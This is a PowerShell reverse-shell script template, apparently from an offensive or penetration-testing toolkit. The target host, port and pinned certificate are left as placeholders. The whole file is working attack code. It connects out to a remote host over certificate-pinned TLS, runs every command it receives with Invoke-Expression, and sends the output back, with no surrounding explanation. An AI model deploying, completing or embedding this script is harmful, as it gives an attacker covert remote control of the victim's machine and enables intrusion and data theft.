$global:conn_host = 'HOSTHERE'
$global:port = PORTHERE
$global:cert = [system.Text.Encoding]::UTF8.GetBytes(@"
CERTHERE
"@)

$callback = [System.Net.Security.RemoteCertificateValidationCallback]{
    param (
        [object] $sender,
        [System.Security.Cryptography.X509Certificates.X509Certificate] $certificate,
        [System.Security.Cryptography.X509Certificates.X509Chain] $chain,
        [System.Net.Security.SslPolicyErrors] $sslPolicyErrors
    )

    $cacert = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2(,$global:cert)
    return ((Compare-Object $cacert.RawData $certificate.RawData) -eq $null)
}

$socket = New-Object Net.Sockets.TcpClient($global:conn_host, $global:port)
$stream = $socket.GetStream()
$sslStream = New-Object System.Net.Security.SslStream($stream,$false,$callback)
$sslStream.AuthenticateAsClient($global:conn_host, $null, 'Tls12', $true)

[byte[]] $bytes = 0..65535 | %{0};

while(($i = $sslStream.Read($bytes, 0, $bytes.Length)) -ne 0)
{
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i);
    $sendback = (iex $data | Out-String) 2>&1;
    $sendback2 = $sendback + "`n";
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $sslStream.Write($sendbyte,0,$sendbyte.Length);
    $sslStream.Flush()
}